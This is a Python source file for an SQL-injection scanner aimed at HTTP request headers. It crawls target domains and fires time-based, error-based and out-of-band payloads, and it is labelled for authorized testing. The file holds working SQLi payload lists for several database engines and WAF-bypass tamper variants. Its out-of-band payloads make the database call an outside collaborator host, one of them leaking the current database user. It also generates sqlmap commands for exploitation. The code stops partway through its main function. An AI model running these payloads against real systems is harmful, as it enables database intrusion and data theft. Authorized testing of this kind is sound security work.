#!/usr/bin/env python3
# =============================================================================
# HEADER SQLi HUNTER  v1.1
# Fast SQLi triage for HTTP request headers (User-Agent / Referer / X-Forwarded-For+).
#
#   Detection channels (complementary):
#     - TIME-BASED : per-URL baseline -> SLEEP probe -> zero-delay control ->
#                    second-delay linear confirm -> re-verify. Adaptive to jitter.
#     - ERROR-BASED: quick ' vs '' status/length diff (catches non-timing sinks).
#     - OOB        : DNS/HTTP callouts for ASYNC logging sinks that timing misses,
#                    each with a unique correlation subdomain -> your collaborator.
#
#   Output: a sqlmap-ready raw request (-r) + one-liner per confirmed header,
#           written incrementally so a crash/Ctrl-C never loses findings.
#
#   Safety: post-harvest --scope allowlist (defaults to your input domains),
#           block-rate visibility, global time budget, per-request jitter.
#
#   AUTHORIZED TESTING ONLY. By Clark Voss
# =============================================================================

import argparse
import asyncio
import csv
import json
import os
import random
import re
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime
from collections import Counter
from statistics import median
from urllib.parse import urlsplit, urljoin
from concurrent.futures import ThreadPoolExecutor

try:
    import httpx
except ImportError:
    sys.exit("[!] Missing dependency. Install with:  pip install httpx")

# --------------------------------------------------------------------------- #
# Colors
# --------------------------------------------------------------------------- #
_TTY = sys.stdout.isatty()
def _c(code): return code if _TTY else ""
RED, GRN, YEL, BLU, MAG, CYN, WHT = (_c(f"\033[3{n}m") for n in range(1, 8))
BOLD, DIM, RST = _c("\033[1m"), _c("\033[2m"), _c("\033[0m")

def banner():
    if not _TTY:
        print("HEADER SQLi HUNTER v1.1"); return
    print(f"""{BOLD}{MAG}
  _  _ ___   _   ___  ___ ___    ___  ___  _    _
 | || | __| /_\\ |   \\| __| _ \\  / __|/ _ \\| |  (_)
 | __ | _| / _ \\| |) | _||   /  \\__ \\ (_) | |__| |
 |_||_|___/_/ \\_\\___/|___|_|_\\  |___/\\__\\_\\____|_|{RST}
   {BOLD}{CYN}H U N T E R{RST}  {DIM}v1.1  •  time / error / OOB header SQLi -> sqlmap{RST}
   {DIM}authorized testing only{RST}
""")

# --------------------------------------------------------------------------- #
# Static-asset filtering
# --------------------------------------------------------------------------- #
STATIC_EXT = {
    "jpg", "jpeg", "png", "gif", "svg", "webp", "bmp", "ico", "tif", "tiff",
    "css", "woff", "woff2", "ttf", "eot", "otf",
    "mp4", "webm", "mp3", "wav", "avi", "mov", "mkv", "ogg", "flv",
    "zip", "tar", "gz", "rar", "7z", "bz2",
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
    "map", "js",
}
def is_static(url: str) -> bool:
    path = urlsplit(url).path.lower()
    tail = path.rsplit("/", 1)[-1]
    if "." not in tail:
        return False
    return tail.rsplit(".", 1)[-1] in STATIC_EXT

def host_of(url: str) -> str:
    return urlsplit(url).netloc.split("@")[-1]

def reg_domain(host: str) -> str:
    h = host.split(":")[0]
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", h):   # bare IPv4 -> use as-is
        return h
    parts = h.split(".")
    return ".".join(parts[-2:]) if len(parts) >= 2 else h

def sanitize(s: str) -> str:
    return "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in s)[:80]

class HostRateLimiter:
    """Enforce a maximum requests/sec PER HOST (spacing between requests)."""
    def __init__(self, rate):
        self.interval = (1.0 / rate) if rate and rate > 0 else 0.0
        self.next, self.locks = {}, {}
    async def wait(self, host):
        if not self.interval:
            return
        lock = self.locks.setdefault(host, asyncio.Lock())
        async with lock:
            now = time.monotonic()
            nxt = self.next.get(host, 0.0)
            if nxt > now:
                await asyncio.sleep(nxt - now)
                now = time.monotonic()
            self.next[host] = max(now, nxt) + self.interval

def _in_business_hours(now):
    """now: tz-aware datetime. True inside Mon-Fri 07:00-19:00."""
    if now.weekday() >= 5:
        return False
    return 7 <= now.hour < 19

# --------------------------------------------------------------------------- #
# Benign header values
# --------------------------------------------------------------------------- #
BENIGN = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    "Referer": "https://www.google.com/",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "X-Requested-With": "XMLHttpRequest",
}
BENIGN_IP = "8.8.8.8"
IP_HEADERS = {"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Client-IP",
              "True-Client-IP", "CF-Connecting-IP", "X-Originating-IP",
              "Forwarded", "X-Forwarded-Host"}
DEFAULT_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For"]
FULL_HEADERS = DEFAULT_HEADERS + ["X-Real-IP", "X-Client-IP", "Client-IP",
                                  "True-Client-IP", "CF-Connecting-IP",
                                  "X-Originating-IP", "X-Forwarded-Host"]
def benign_value(header: str) -> str:
    if header in BENIGN: return BENIGN[header]
    if header in IP_HEADERS: return BENIGN_IP
    return BENIGN["User-Agent"]

# --------------------------------------------------------------------------- #
# Payloads.  time-based use {d} (sleep secs). OOB use {c} (correlation subdomain).
# Injected value is  <benign base><payload>  so requests still look real.
# --------------------------------------------------------------------------- #
TIME_PAYLOADS = [  # (dbms, context, template)
    ("mysql",    "single-quote", "'XOR(SELECT(0)FROM(SELECT(SLEEP({d})))a)XOR'Z"),
    ("mysql",    "single-quote", "'XOR(if(now()=sysdate(),sleep({d}),0))XOR'Z"),
    ("mysql",    "double-quote", '"XOR(SELECT(0)FROM(SELECT(SLEEP({d})))a)XOR"Z'),
    ("mysql",    "unquoted",     "(SELECT(0)FROM(SELECT(SLEEP({d})))a)"),
    ("mysql",    "single-quote", "' AND SLEEP({d})-- -"),
    ("mysql",    "single-quote", "'||(SELECT SLEEP({d}))||'"),
    ("mssql",    "single-quote", "' WAITFOR DELAY '0:0:{d}'-- -"),
    ("mssql",    "stacked",      "';WAITFOR DELAY '0:0:{d}'-- -"),
    ("postgres", "single-quote", "'||(SELECT ''x'' FROM PG_SLEEP({d}))||'"),
    ("postgres", "stacked",      "';SELECT PG_SLEEP({d})-- -"),
    ("postgres", "single-quote", "' AND 1=(SELECT 1 FROM PG_SLEEP({d}))-- -"),
    ("oracle",   "single-quote", "'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(66),{d})||'"),
]
# OOB templates. NOTE the requirements/caveats per DBMS in comments.
OOB_PAYLOADS = [  # (dbms, context, template)
    # MSSQL xp_dirtree -> SMB/DNS (very reliable when xp_dirtree is enabled)
    ("mssql",   "stacked",      r"';EXEC master..xp_dirtree '\\{c}\x';-- -"),
    ("mssql",   "single-quote", r"' EXEC master..xp_dirtree '\\{c}\x'-- -"),
    # Oracle callouts (no backslashes)
    ("oracle",  "single-quote", "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('{c}') FROM DUAL)||'"),
    ("oracle",  "single-quote", "'||UTL_HTTP.REQUEST('http://{c}/')||'"),
    ("oracle",  "single-quote", "'||DBMS_LDAP.INIT('{c}',80)||'"),
    # PostgreSQL (COPY..PROGRAM needs superuser; dblink needs the extension)
    ("postgres","stacked",      "';COPY (SELECT 1) TO PROGRAM 'nslookup {c}'-- -"),
    ("postgres","single-quote", "';SELECT dblink_connect('host={c} port=80 dbname=x user=x password=x')-- -"),
    # MySQL LOAD_FILE UNC -> DNS (Windows only, secure_file_priv dependent)
    ("mysql",   "single-quote", r"' AND LOAD_FILE(CONCAT('\\',(SELECT HEX(CURRENT_USER())),'.{c}\a'))-- -"),
    ("mysql",   "single-quote", r"' AND LOAD_FILE('\\{c}\a')-- -"),
]

_KW = ["SELECT","SLEEP","WAITFOR","DELAY","PG_SLEEP","UNION","XOR","AND","OR",
       "FROM","WHERE","IF","NOW","SYSDATE","EXEC","LOAD_FILE","CONCAT"]
def _mixcase(s: str) -> str:
    def rep(m):
        return "".join(ch.upper() if i % 2 else ch.lower()
                       for i, ch in enumerate(m.group()))
    for k in _KW:
        s = re.sub(k, rep, s, flags=re.I)
    return s
def tamper_variants(tpl: str) -> list[str]:
    out = [tpl]
    if " " in tpl:
        out.append(tpl.replace(" ", "/**/"))
    out.append(_mixcase(tpl))
    if " " in tpl:
        out.append(_mixcase(tpl).replace(" ", "/**/"))
    return list(dict.fromkeys(out))

# --------------------------------------------------------------------------- #
# Data model
# --------------------------------------------------------------------------- #
@dataclass
class Target:
    url: str
    method: str = "GET"
    body: str = ""
    extra_headers: dict = field(default_factory=dict)

@dataclass
class Hit:
    host: str
    url: str
    method: str
    header: str
    technique: str          # time-based | error-based | oob
    dbms: str
    context: str
    payload: str
    baseline: float = 0.0
    t_probe: float = 0.0
    t_control: float = 0.0
    t_confirm: float = 0.0
    d1: int = 0
    d2: int = 0
    confidence: float = 0.0
    notes: str = ""
    reqfile: str = ""
    sqlmap: str = ""

# --------------------------------------------------------------------------- #
# Harvesting
# --------------------------------------------------------------------------- #
def _run(cmd, feed=None, timeout=180):
    try:
        p = subprocess.run(cmd, input=feed, capture_output=True, text=True, timeout=timeout)
        return p.stdout or ""
    except Exception:
        return ""

def _host_only(s: str) -> str:
    s = s.strip()
    if s.startswith(("http://", "https://")): return host_of(s)
    return s.split("/")[0].split("?")[0]

def _grep_urls(text): return re.findall(r"https?://[^\s\"'<>\]]+", text)

# LinkFinder-style: quoted absolute URLs, /paths, ./ and ../ relatives, api/v1 forms
JS_EP_RE = re.compile(
    r"""["'`]("""
    r"""(?:https?://[^"'`\s]{6,})"""
    r"""|(?:/[a-zA-Z0-9_][a-zA-Z0-9_./?=&%~+-]{1,200})"""
    r"""|(?:\.{1,2}/[a-zA-Z0-9_./?=&%~+-]{2,200})"""
    r"""|(?:[a-zA-Z0-9_-]+/[a-zA-Z0-9_./?=&%~+-]{2,120})"""
    r""")["'`]""")

def _extract_js_endpoints(js_urls, base, args):
    eps = set()
    try:
        client = httpx.Client(verify=False, timeout=15, follow_redirects=True,
                              proxy=getattr(args, "proxy", None) or None)
    except Exception:
        return eps
    for j in list(js_urls)[:args.harvest_js_max]:
        try:
            r = client.get(j)
            if r.status_code != 200 or "javascript" not in r.headers.get("content-type", "js"):
                if not j.lower().endswith(".js"): continue
            for m in JS_EP_RE.findall(r.text):
                u = m.strip()
                if any(c in u for c in " \t<>"): continue
                eps.add(u if u.startswith("http") else urljoin(base, u))
        except Exception:
            continue
    client.close()
    return eps

def harvest_domain(domain, args):
    """Quick multi-tool URL harvest (passive + JS-aware crawl) for one domain."""
    host = _host_only(domain)
    base = f"https://{host}"
    urls, stats = set(), {}
    T = args.harvest_timeout
    D = str(args.harvest_depth)
    if shutil.which("waybackurls"):
        out = _run(["waybackurls"], feed=host, timeout=T)
        w = [l.strip() for l in out.splitlines() if l.startswith("http")]
        urls.update(w); stats["wb"] = len(w)
    if shutil.which("gau"):
        out = _run(["gau", "--threads", "5", host], timeout=T)
        g = [l.strip() for l in out.splitlines() if l.startswith("http")]
        urls.update(g); stats["gau"] = len(g)
    if not args.passive_harvest and shutil.which("katana"):
        out = _run(["katana", "-u", base, "-d", D, "-jc", "-silent"], timeout=T)
        k = [l.strip() for l in out.splitlines() if l.startswith("http")]
        urls.update(k); stats["katana"] = len(k)
    if not args.passive_harvest and shutil.which("gospider"):
        out = _run(["gospider", "-s", base, "-d", D, "-q", "-t", "10"], timeout=T)
        gs = _grep_urls(out); urls.update(gs); stats["gospider"] = len(gs)
    if not args.passive_harvest and shutil.which("hakrawler"):
        out = _run(["hakrawler", "-d", D, "-u"], feed=base, timeout=T)
        h = [l.strip() for l in out.splitlines() if l.startswith("http")]
        urls.update(h); stats["hak"] = len(h)
    if not args.no_harvest_js:
        js_urls = {u for u in urls if urlsplit(u).path.lower().endswith(".js")}
        if js_urls:
            eps = _extract_js_endpoints(js_urls, base, args)
            urls.update(eps); stats["js"] = len(eps)
    rd = reg_domain(host)                        # keep same registrable domain (+subdomains)
    urls = {u for u in urls if u.startswith("http") and reg_domain(host_of(u)) == rd}
    if not urls:
        urls.update([base + "/", base + "/search?q=1", base + "/index.php",
                     base + "/api/v1/status", base + "/login"])
        stats["fallback"] = 5
    return urls, stats

def load_targets(path: str):
    domains, urls = [], []
    with open(path) as fh:
        for raw in fh:
            t = raw.strip()
            if not t or t.startswith("#"): continue
            if t.startswith(("http://", "https://")): urls.append(t)
            elif "/" in t or "?" in t: urls.append("https://" + t)
            else: domains.append(t)
    return domains, urls

def parse_request_file(path: str, scheme="https") -> Target | None:
    """Parse a raw HTTP request (Burp 'Copy to file' style) -> Target with body."""
    try:
        raw = open(path, "r", errors="replace").read()
    except Exception:
        return None
    if "\r\n\r\n" in raw: head, _, body = raw.partition("\r\n\r\n")
    else: head, _, body = raw.partition("\n\n")
    lines = head.replace("\r\n", "\n").split("\n")
    if not lines: return None
    parts = lines[0].split()
    if len(parts) < 2: return None
    method, pathq = parts[0], parts[1]
    hdrs, host = {}, ""
    for ln in lines[1:]:
        if ":" not in ln: continue
        k, v = ln.split(":", 1); k, v = k.strip(), v.strip()
        if k.lower() == "host": host = v; continue
        if k.lower() in ("content-length", "connection", "accept-encoding"): continue
        hdrs[k] = v
    if not host: return None
    if pathq.startswith("http"): url = pathq
    else: url = f"{scheme}://{host}{pathq}"
    return Target(url=url, method=method, body=body, extra_headers=hdrs)

# --------------------------------------------------------------------------- #
# Filtering + sampling
# --------------------------------------------------------------------------- #
DYNAMIC_HINTS = (".php", ".asp", ".aspx", ".jsp", ".do", ".cgi", "/api", "/v1",
                 "/v2", "/graphql", "/rest", "/ajax")
def prioritize(urls, max_per_host):
    by_host, seen = {}, set()
    for u in urls:
        if is_static(u): continue
        h = host_of(u)
        if not h: continue
        sp = urlsplit(u); key = f"{h}{sp.path}"
        if key in seen: continue
        seen.add(key); by_host.setdefault(h, []).append(u)
    def score(u):
        s = 0; sp = urlsplit(u)
        if sp.query: s += 3
        if any(k in u.lower() for k in DYNAMIC_HINTS): s += 2
        if sp.path in ("", "/"): s += 1
        return -s
    picked = []
    for h, g in by_host.items():
        roots = [u for u in g if urlsplit(u).path in ("", "/")]
        rest = sorted([u for u in g if u not in roots], key=score)
        picked.extend((roots[:1] + rest)[:max_per_host])
    return picked

def in_scope(url, scope_suffixes, scope_res):
    h = host_of(url).split(":")[0]
    if any(h == s or h.endswith("." + s) for s in scope_suffixes): return True
    if any(rx.search(url) for rx in scope_res): return True
    return not scope_suffixes and not scope_res

# --------------------------------------------------------------------------- #
# HTTP + detection
# --------------------------------------------------------------------------- #
async def send(client, target, header, value, timeout, args, close=False):
    """Return (elapsed, status, length) or (None, None, None) on failure."""
    rl = getattr(args, "_rate", None)
    if rl:
        await rl.wait(host_of(target.url))
    if args.jitter:
        await asyncio.sleep(random.uniform(0, args.jitter))
    hdrs = {**BENIGN, **target.extra_headers, **args._auth}
    hdrs[header] = value
    if close: hdrs["Connection"] = "close"
    t0 = time.perf_counter()
    try:
        r = await client.request(target.method, target.url, headers=hdrs,
                                 content=target.body or None, timeout=timeout)
        n = len(r.content)
        return time.perf_counter() - t0, r.status_code, n
    except Exception:
        return None, None, None

def _count_status(state, host, status):
    if status is None: return
    c = state["status"].setdefault(host, {"total": 0, "blocked": 0})
    c["total"] += 1
    if status in (403, 429) or status >= 500: c["blocked"] += 1

async def probe_sequence(client, target, header, base_val, tpl, args, baseline, jitter, close=False):
    """One time-based check: probe(d1) -> control(0) -> confirm(d2)."""
    d1, d2, cand = args.delay, args.delay2, args.candidate_factor
    tmo = d2 + 20
    thresh = max(d1 * cand, jitter * 3 + 0.4)
    t1, s1, _ = await send(client, target, header, base_val + tpl.format(d=d1), tmo, args, close)
    if t1 is None or (t1 - baseline) < thresh:
        return None
    t0, _, _ = await send(client, target, header, base_val + tpl.format(d=0), tmo, args, close)
    if t0 is None or (t0 - baseline) >= d1 * 0.5:
        return None
    t2, _, _ = await send(client, target, header, base_val + tpl.format(d=d2), tmo, args, close)
    if t2 is None: return None
    if not ((t2 - baseline) >= d2 * cand and (t2 - t1) >= (d2 - d1) * 0.5):
        return None
    conf = min(1.0, (((t1 - baseline) / d1) + ((t2 - baseline) / d2)) / 2)
    return (t1, t0, t2, conf)

async def test_target(client, target, headers, time_payloads, args, state, progress):
    host = host_of(target.url)

    # ---- baseline ----
    samples, statuses = [], []
    for _ in range(args.baseline_samples):
        e, s, _ = await send(client, target, "User-Agent", benign_value("User-Agent"),
                             args.delay2 + 20, args)
        _count_status(state, host, s)
        if e is not None: samples.append(e)
        if s is not None: statuses.append(s)
    if len(samples) < 2:
        progress["done"] += 1; return
    if args.skip_404 and statuses and Counter(statuses).most_common(1)[0][0] in (404, 410):
        state["skipped_404"] += 1
        progress["done"] += 1; return
    baseline = median(samples)
    jitter = max(samples) - min(samples)
    timing_ok = baseline <= args.max_baseline

    for header in headers:
        if args.stop_on_hit and (host, header) in state["confirmed"]:
            continue
        base_val = benign_value(header)

        # ---- error-based quick diff ( ' vs '' ) ----
        if args.error_probe:
            e1, st1, ln1 = await send(client, target, header, base_val + "'", 20, args)
            e2, st2, ln2 = await send(client, target, header, base_val + "''", 20, args)
            _count_status(state, host, st1); _count_status(state, host, st2)
            if st1 is not None and st2 is not None:
                status_flip = st1 != st2
                len_flip = ln1 is not None and ln2 is not None and \
                    max(ln1, ln2) > 0 and abs(ln1 - ln2) / max(ln1, ln2, 1) > 0.30
                if status_flip or len_flip:
                    note = (f"single-quote {st1}/{ln1}B vs balanced {st2}/{ln2}B "
                            f"({'status' if status_flip else 'length'} diff)")
                    emit_hit(Hit(host=host, url=target.url, method=target.method,
                                 header=header, technique="error-based", dbms="",
                                 context="single-quote", payload="'  (vs  '')",
                                 confidence=0.5, notes=note), args, state, target)

        # ---- time-based ----
        if timing_ok:
            for dbms, ctx, tpl in time_payloads:
                if args.stop_on_hit and (host, header) in state["confirmed"]:
                    break
                res = await probe_sequence(client, target, header, base_val, tpl,
                                           args, baseline, jitter)
                if not res: continue
                ok = True
                for _ in range(args.verify_hits):  # re-verify on fresh connections
                    if not await probe_sequence(client, target, header, base_val, tpl,
                                                args, baseline, jitter, close=True):
                        ok = False; break
                if not ok: continue
                t1, t0, t2, conf = res
                emit_hit(Hit(host=host, url=target.url, method=target.method,
                             header=header, technique="time-based", dbms=dbms,
                             context=ctx, payload=tpl.format(d=args.delay),
                             baseline=round(baseline, 2), t_probe=round(t1, 2),
                             t_control=round(t0, 2), t_confirm=round(t2, 2),
                             d1=args.delay, d2=args.delay2, confidence=round(conf, 2)),
                         args, state, target)
                if args.stop_on_hit: break

        # ---- OOB (async-sink coverage) ----
        if args.collab and not (args.stop_on_hit and (host, header) in state["confirmed"]):
            for dbms, ctx, tpl in state["oob_payloads"]:
                token = f"{state['oob_idx']:05x}{random.randint(0,0xffff):04x}"
                state["oob_idx"] += 1
                sub = f"{token}.{args.collab}"
                val = base_val + tpl.format(c=sub)
                await send(client, target, header, val, 20, args)
                log_oob(args, {"token": token, "subdomain": sub, "host": host,
                               "url": target.url, "method": target.method,
                               "header": header, "dbms": dbms, "context": ctx,
                               "injected_value": val, "body": target.body,
                               "time": datetime.now().isoformat(timespec="seconds")})
    progress["done"] += 1

# --------------------------------------------------------------------------- #
# Output (incremental)
# --------------------------------------------------------------------------- #
def build_reqfile(target, header, outdir, tag):
    """Emit the real request (method, path, original headers, body) with a '*'
    sqlmap injection marker on the tested header."""
    sp = urlsplit(target.url); path = sp.path or "/"
    if sp.query: path += "?" + sp.query
    base_val = benign_value(header)
    hdrs = {**BENIGN, **(target.extra_headers or {})}
    hdrs.pop(header, None)  # tested header re-added last, with marker
    lines = [f"{target.method} {path} HTTP/1.1", f"Host: {sp.netloc}"]
    for k, v in hdrs.items():
        if k.lower() in ("host", "connection", "content-length"): continue
        lines.append(f"{k}: {v}")
    lines.append(f"{header}: {base_val}*")
    body = target.body or ""
    if body:
        lines.append(f"Content-Length: {len(body)}")
    lines.append("Connection: close")
    lines.append("")            # end of headers
    lines.append(body)          # body (empty for GET)
    host = host_of(target.url)
    fpath = os.path.join(outdir, "hits", f"{sanitize(host)}_{sanitize(header)}_{tag}.req")
    with open(fpath, "w") as fh: fh.write("\n".join(lines))
    return fpath

def sqlmap_command(hit):
    tech = {"time-based": "T", "error-based": "E", "oob": "T,E"}.get(hit.technique, "T")
    dbms = f" --dbms={hit.dbms}" if hit.dbms else ""
    return (f"sqlmap -r {hit.reqfile} --technique={tech}{dbms} "
            f"--batch --threads=10 --level=2 --risk=2")

def report_hit(hit):
    tag = {"time-based": GRN, "error-based": YEL, "oob": CYN}.get(hit.technique, WHT)
    print(f"\n{BOLD}{tag}[HIT:{hit.technique}]{RST} {BOLD}{hit.host}{RST}  "
          f"header={BOLD}{YEL}{hit.header}{RST}  "
          f"{('dbms=' + hit.dbms + '  ') if hit.dbms else ''}conf={hit.confidence}")
    print(f"      {DIM}url:{RST} {hit.url}  {DIM}[{hit.method}]{RST}")
    if hit.technique == "time-based":
        print(f"      {DIM}timing:{RST} base={hit.baseline}s probe({hit.d1})={hit.t_probe}s "
              f"control(0)={hit.t_control}s confirm({hit.d2})={hit.t_confirm}s")
    if hit.notes:
        print(f"      {DIM}note:{RST} {hit.notes}")
    print(f"      {DIM}payload:{RST} {hit.header}: <legit>{CYN}{hit.payload}{RST}")

def emit_hit(hit, args, state, target):
    key = (hit.host, hit.header, hit.technique)
    if key in state["emitted"]:
        return
    state["emitted"].add(key)
    if hit.technique == "time-based":
        state["confirmed"].add((hit.host, hit.header))
    tag = hit.dbms or hit.technique
    hit.reqfile = build_reqfile(target, hit.header, args.outdir, tag)
    hit.sqlmap = sqlmap_command(hit)
    with open(os.path.join(args.outdir, "hits.jsonl"), "a") as fh:
        fh.write(json.dumps(asdict(hit)) + "\n")
    with open(os.path.join(args.outdir, "sqlmap_commands.sh"), "a") as fh:
        fh.write(f"# {hit.host} [{hit.header}] {hit.technique} conf={hit.confidence}\n"
                 f"{hit.sqlmap}\n\n")
    state["hits"].append(hit)
    report_hit(hit)

def log_oob(args, entry):
    with open(os.path.join(args.outdir, "oob_correlation.jsonl"), "a") as fh:
        fh.write(json.dumps(entry) + "\n")
    p = os.path.join(args.outdir, "oob_correlation.csv")
    new = not os.path.exists(p)
    with open(p, "a", newline="") as fh:
        w = csv.writer(fh)
        if new:
            w.writerow(["token", "subdomain", "host", "url", "method", "header",
                        "dbms", "context", "injected_value", "time"])
        w.writerow([entry[k] for k in ("token", "subdomain", "host", "url", "method",
                                       "header", "dbms", "context", "injected_value", "time")])

def finalize_reports(state, outdir):
    hits = state["hits"]
    with open(os.path.join(outdir, "hits.json"), "w") as fh:
        json.dump([asdict(h) for h in hits], fh, indent=2)
    with open(os.path.join(outdir, "hits.csv"), "w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["host", "header", "technique", "dbms", "context", "confidence",
                    "baseline", "probe", "control", "confirm", "notes", "url", "reqfile"])
        for h in hits:
            w.writerow([h.host, h.header, h.technique, h.dbms, h.context, h.confidence,
                        h.baseline, h.t_probe, h.t_control, h.t_confirm, h.notes,
                        h.url, h.reqfile])

# --------------------------------------------------------------------------- #
# Orchestration
# --------------------------------------------------------------------------- #
async def scan(targets, headers, time_payloads, args, state):
    limits = httpx.Limits(max_connections=args.concurrency + 10,
                          max_keepalive_connections=args.concurrency)
    gsem = asyncio.Semaphore(args.concurrency)
    host_sems = {}
    progress = {"done": 0, "total": len(targets)}
    deadline = time.time() + args.max_runtime if args.max_runtime else None

    async with httpx.AsyncClient(verify=False, follow_redirects=True, limits=limits,
                                 proxy=args.proxy or None) as client:
        async def worker(tg):
            if deadline and time.time() > deadline:
                progress["done"] += 1; return
            h = host_of(tg.url)
            hsem = host_sems.setdefault(h, asyncio.Semaphore(args.per_host))
            async with gsem, hsem:
                await test_target(client, tg, headers, time_payloads, args, state, progress)
        tasks = [asyncio.create_task(worker(t)) for t in targets]
        while any(not t.done() for t in tasks):
            if _TTY:
                print(f"\r{DIM}  scanning {progress['done']}/{progress['total']} "
                      f"targets | hits:{len(state['hits'])} oob:{state['oob_idx']}{RST}",
                      end="", flush=True)
            await asyncio.sleep(0.5)
        await asyncio.gather(*tasks)
        if _TTY: print(f"\r{' ' * 74}\r", end="")

# --------------------------------------------------------------------------- #
# Standalone: rebuild a sqlmap request from a fired OOB token
# --------------------------------------------------------------------------- #
def rebuild_req(args):
    p = os.path.join(args.outdir, "oob_correlation.jsonl")
    if not os.path.exists(p):
        sys.exit(f"[!] {p} not found (run a scan with --collab first)")
    entry = None
    for line in open(p):
        e = json.loads(line)
        if e["token"] == args.rebuild_req or e["subdomain"].startswith(args.rebuild_req):
            entry = e; break
    if not entry:
        sys.exit(f"[!] token {args.rebuild_req} not in correlation log")
    hit = Hit(host=entry["host"], url=entry["url"], method=entry["method"],
              header=entry["header"], technique="oob", dbms=entry["dbms"],
              context=entry["context"], payload=entry["injected_value"], confidence=1.0,
              notes=f"OOB callout confirmed via {entry['subdomain']}")
    tg = Target(url=entry["url"], method=entry["method"], body=entry.get("body", ""))
    hit.reqfile = build_reqfile(tg, hit.header, args.outdir, f"oob_{entry['token']}")
    hit.sqlmap = sqlmap_command(hit)
    print(f"{BOLD}{GRN}[OOB CONFIRMED]{RST} {hit.host} [{hit.header}] dbms={hit.dbms}")
    print(f"  req:    {hit.reqfile}")
    print(f"  sqlmap: {hit.sqlmap}")

# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(
        description="Time/error/OOB SQLi triage for HTTP request headers.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("input", nargs="?", help="file of targets (domains and/or URLs)")
    ap.add_argument("-o", "--outdir", default="header_sqli_out")
    ap.add_argument("--urls-only", action="store_true", help="skip harvesting; every line is a URL")
    ap.add_argument("--requests-dir", help="folder of raw HTTP request files (POST/GET w/ bodies)")
    ap.add_argument("--req-scheme", default="https", help="scheme for parsed request files")
    ap.add_argument("--max-per-host", type=int, default=12)
    ap.add_argument("--harvest", action="store_true",
                    help="harvest endpoints for EVERY input line (turns a domain list into URLs)")
    ap.add_argument("--harvest-depth", type=int, default=2, help="crawl depth for katana/gospider/hakrawler")
    ap.add_argument("--harvest-workers", type=int, default=5, help="domains harvested in parallel")
    ap.add_argument("--harvest-timeout", type=int, default=120, help="seconds per tool per domain")
    ap.add_argument("--harvest-js-max", type=int, default=20, help="max .js files fetched for endpoint extraction")
    ap.add_argument("--no-harvest-js", action="store_true", help="skip pulling endpoints out of JS files")
    ap.add_argument("--passive-harvest", action="store_true",
                    help="harvest ONLY via gau/waybackurls (no active crawlers that could submit a form)")
    ap.add_argument("--no-post", action="store_true",
                    help="never send non-GET; skip form-submission replay (scope-safe for 'forms OOS' targets)")
    ap.add_argument("--rate", type=float, default=0.0,
                    help="max requests per second PER HOST (throttle; 0 = unlimited)")
    ap.add_argument("--skip-404", action="store_true",
                    help="skip payload testing on URLs whose baseline is 404/410 (cut requests to non-existent resources)")
    ap.add_argument("--respect-hours", action="store_true",
                    help="refuse to run during core business hours (Mon-Fri 07:00-19:00 America/New_York)")
    # scope
    ap.add_argument("--scope", help="comma list of in-scope domain suffixes and/or 're:REGEX'")
    ap.add_argument("--no-auto-scope", action="store_true",
                    help="don't auto-restrict scope to the input domains")
    # headers / payloads
    ap.add_argument("--headers", help="comma list of headers to test (overrides defaults)")
    ap.add_argument("--headers-full", action="store_true", help="also test the IP-spoof header set")
    ap.add_argument("--dbms", default="mysql,mssql,postgres", help="mysql,mssql,postgres,oracle or 'all'")
    ap.add_argument("--tamper", action="store_true", help="add /**/ + mixed-case WAF-bypass variants")
    ap.add_argument("--no-error-probe", dest="error_probe", action="store_false",
                    help="disable the ' vs '' error-based diff channel")
    ap.set_defaults(error_probe=True)
    # OOB
    ap.add_argument("--collab", help="collaborator domain for OOB (e.g. abc123.your-collab.net)")
    ap.add_argument("--no-oob", action="store_true", help="disable OOB even if a collaborator is set")
    ap.add_argument("--rebuild-req", metavar="TOKEN",
                    help="rebuild a sqlmap request for a fired OOB token, then exit")
    # auth
    ap.add_argument("--cookie", help="Cookie header sent on every request")
    ap.add_argument("--header", action="append", default=[], metavar="K:V",
                    help="extra header on every request (repeatable, e.g. Authorization)")
    # timing / detection
    ap.add_argument("--delay", type=int, default=5, help="probe SLEEP seconds (d1)")
    ap.add_argument("--delay2", type=int, default=10, help="confirm SLEEP seconds (d2)")
    ap.add_argument("--baseline-samples", type=int, default=3)
    ap.add_argument("--candidate-factor", type=float, default=0.6)
    ap.add_argument("--max-baseline", type=float, default=6.0)
    ap.add_argument("--verify-hits", type=int, default=1, help="extra re-verify passes per hit")
    # speed / transport / safety
    ap.add_argument("--concurrency", type=int, default=25)
    ap.add_argument("--per-host", type=int, default=2)
    ap.add_argument("--jitter", type=float, default=0.0, help="max random secs added per request")
    ap.add_argument("--max-runtime", type=int, default=0, help="global time budget in secs (0=none)")
    ap.add_argument("--method", default="GET")
    ap.add_argument("--proxy", help="route the tool HTTP through a proxy, e.g. http://127.0.0.1:8080 (Burp). Covers scan + JS-extraction, not the crawlers.")
    ap.add_argument("--test-all-endpoints", dest="stop_on_hit", action="store_false",
                    help="test every endpoint (don't stop at first hit per host/header)")
    ap.set_defaults(stop_on_hit=True)
    args = ap.parse_args()

    banner()
    os.makedirs(os.path.join(args.outdir, "hits"), exist_ok=True)

    if args.rebuild_req:
        rebuild_req(args); return

    if not args.input and not args.requests_dir:
        sys.exit("[!] provide an input file and/or --requests-dir")

    # ---- core business-hours guard (Mon-Fri 07:00-19:00 America/New_York) ----
    if args.respect_hours:
        try:
            from zoneinfo import ZoneInfo
            now_et = datetime.now(ZoneInfo("America/New_York"))
        except Exception as e:
            sys.exit(f"[!] --respect-hours: cannot load timezone data ({e}); "
                     f"run 'pip install tzdata'. Refusing to run (verify the window manually).")
